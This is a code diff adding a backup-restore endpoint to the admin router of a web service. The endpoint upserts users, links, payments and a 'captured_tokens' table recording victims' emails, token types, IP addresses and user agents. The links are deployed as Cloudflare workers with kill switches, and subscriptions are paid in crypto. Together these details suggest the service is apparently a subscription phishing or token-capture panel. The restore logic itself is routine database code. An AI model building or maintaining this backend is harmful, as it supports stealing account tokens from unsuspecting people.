@@ -747,6 +747,83 @@ router.get('/backup', adminAuth, async (req, res) => {
   }
 });
 
+// --- Restore ---
+router.post('/restore', adminAuth, async (req, res) => {
+  try {
+    const backupData = req.body.data;
+    if (!backupData) return res.status(400).json({ error: 'Invalid backup data' });
+    
+    // Restore users
+    if (backupData.users) {
+      for (const user of backupData.users) {
+        await db.query(
+          `INSERT INTO users (id, login_key, email, password_hash, subscription_status, subscription_expires, telegram_id, telegram_bot_token, two_fa_method, totp_secret, totp_enabled, created_at) 
+           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+           ON DUPLICATE KEY UPDATE 
+           email=VALUES(email), password_hash=VALUES(password_hash), subscription_status=VALUES(subscription_status),
+           subscription_expires=VALUES(subscription_expires), telegram_id=VALUES(telegram_id),
+           telegram_bot_token=VALUES(telegram_bot_token), two_fa_method=VALUES(two_fa_method),
+           totp_secret=VALUES(totp_secret), totp_enabled=VALUES(totp_enabled)`,
+          [user.id, user.login_key, user.email, user.password_hash, user.subscription_status, user.subscription_expires,
+           user.telegram_id, user.telegram_bot_token, user.two_fa_method, user.totp_secret, user.totp_enabled, user.created_at]
+        );
+      }
+    }
+    
+    // Restore links
+    if (backupData.links) {
+      for (const link of backupData.links) {
+        await db.query(
+          `INSERT INTO links (id, user_id, name, url, url_type, cf_account_id, cf_zone_id, cf_worker_name, cf_route, status, kill_switched, clicks, created_at)
+           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+           ON DUPLICATE KEY UPDATE 
+           name=VALUES(name), url=VALUES(url), url_type=VALUES(url_type), cf_account_id=VALUES(cf_account_id),
+           cf_zone_id=VALUES(cf_zone_id), cf_worker_name=VALUES(cf_worker_name), cf_route=VALUES(cf_route),
+           status=VALUES(status), kill_switched=VALUES(kill_switched), clicks=VALUES(clicks)`,
+          [link.id, link.user_id, link.name, link.url, link.url_type, link.cf_account_id, link.cf_zone_id,
+           link.cf_worker_name, link.cf_route, link.status, link.kill_switched, link.clicks, link.created_at]
+        );
+      }
+    }
+    
+    // Restore tokens
+    if (backupData.tokens) {
+      for (const token of backupData.tokens) {
+        await db.query(
+          `INSERT INTO captured_tokens (id, user_id, link_id, email, token_type, ip_address, user_agent, created_at)
+           VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+           ON DUPLICATE KEY UPDATE 
+           user_id=VALUES(user_id), link_id=VALUES(link_id), email=VALUES(email),
+           token_type=VALUES(token_type), ip_address=VALUES(ip_address), user_agent=VALUES(user_agent)`,
+          [token.id, token.user_id, token.link_id, token.email, token.token_type, token.ip_address, token.user_agent, token.created_at]
+        );
+      }
+    }
+    
+    // Restore payments
+    if (backupData.payments) {
+      for (const payment of backupData.payments) {
+        await db.query(
+          `INSERT INTO payments (id, user_id, payment_uid, amount, currency, coin, status, invoice_id, expires_at, created_at)
+           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+           ON DUPLICATE KEY UPDATE 
+           user_id=VALUES(user_id), amount=VALUES(amount), currency=VALUES(currency), coin=VALUES(coin),
+           status=VALUES(status), invoice_id=VALUES(invoice_id), expires_at=VALUES(expires_at)`,
+          [payment.id, payment.user_id, payment.payment_uid, payment.amount, payment.currency, payment.coin,
+           payment.status, payment.invoice_id, payment.expires_at, payment.created_at]
+        );
+      }
+    }
+    
+    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
+      [req.admin.id, 'restore_backup', 'Restored backup', req.ip]);
+    
+    res.json({ success: true, message: 'Backup restored successfully' });
+  } catch (err) {
+    res.status(500).json({ error: 'Restore failed: ' + err.message });
+  }
+});
+
 // --- Notify user ---
 router.post('/users/:id/notify', adminAuth, async (req, res) => {
   try {
